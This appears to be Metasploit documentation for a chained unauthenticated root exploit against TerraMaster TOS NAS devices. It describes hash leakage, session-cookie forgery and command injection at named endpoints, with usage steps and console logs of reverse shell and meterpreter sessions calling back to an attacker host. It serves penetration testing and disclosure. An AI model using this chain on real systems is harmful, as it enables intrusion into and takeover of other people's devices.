## Vulnerable Application

This module provides a Terramaster chained exploit that performs session crafting to achieve escalated privileges
that allows an attacker to access vulnerable code execution flaws. TerraMaster Operating System (TOS) versions
`4.2.15` and below are affected.

[CVE-2021-45839](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45839) is exploited to obtain the first administrator's
hash set up on the system as well as other information such as MAC address, by performing a POST request to the
`/module/api.php?mobile/webNasIPS` vulnerable endpoint.
This information is used to craft an unauthenticated admin session using vulnerability
[CVE-2021-45841](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45841) where an attacker can self-sign session cookies
by knowing the target MAC address and the user password hash. Guest users (disabled by default) can be abused using a null/empty hash
and allow an unauthenticated attacker to login as guest which is used to download the `/etc/group` info to obtain the list of admin users
to be used for the session crafting.

Finally, [CVE-2021-45837](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45837) is exploited to execute arbitrary commands as root
by sending a specifically crafted input to vulnerable endpoint `/tos/index.php?app/del`.

This module has been tested against a TerraMaster `F2-221` Model with the specifications listed below:

* TerraMaster F2-221
* CPU: `x86`
* TOS Version: `4.2.08`

## Verification Steps

1. `use exploit/linux/http/terramaster_unauth_rce_cve_2021_45837`
1. `set RHOSTS <TARGET HOSTS>`
1. `set RPORT <port>`
1. `set LHOST <attacker host ip>`
1. `set LPORT <attacker host port>`
1. `set TARGET <0-Unix command or 1-Linux Dropper>`
1. `exploit`
1. You should get a `bash` shell or `meterpreter` session depending on the `target` and `payload` settings.

## Options
No specific options.

## Scenarios

### TerraMaster F2-210 TOS 4.2.08 - Unix Command `cmd/unix/reverse_bash` session
```
msf6 exploit(linux/http/terramaster_unauth_rce_cve_2021_45837) > set target 0
target => 0
msf6 exploit(linux/http/terramaster_unauth_rce_cve_2021_45837) > exploit

[*] Started reverse TCP handler on 192.168.10.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. TOS version is 4.2.08 and CPU architecture is X64.
[*] Executing Unix Command for cmd/unix/reverse_bash
[*] Command shell session 1 opened (192.168.10.1:4444 -> 192.168.10.2:41822) at 2023-06-06 07:27:36 +0000

uname -a
Linux TerrorMaster 4.13.16 SMP Tue Jun 06 09:28:43 CET 2023 x86_64 GNU/Linux
id
uid=0(root) gid=0(root) groups=0(root)
```
### TerraMaster F2-210 TOS 4.2.08 - Linux Dropper `linux/x64/meterpreter/reverse_tcp` session
```
msf6 exploit(linux/http/terramaster_unauth_rce_cve_2021_45837) > set target 1
target => 1
msf6 exploit(linux/http/terramaster_unauth_rce_cve_2021_45837) > exploit

[*] Started reverse TCP handler on 192.168.10.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. TOS version is 4.2.08 and CPU architecture is X64.
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
[*] Sending stage (3045348 bytes) to 127.0.0.1
[*] Meterpreter session 2 opened (192.168.10.1:4444 -> 192.168.10.2:36938) at 2023-06-06 07:29:50 +0000
[*] Command Stager progress - 100.00% done (823/823 bytes)

meterpreter > sysinfo
Computer     : 192.168.10.2
OS           :  (Linux 4.13.16)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: root
meterpreter >
```

## Limitations
No limitations.
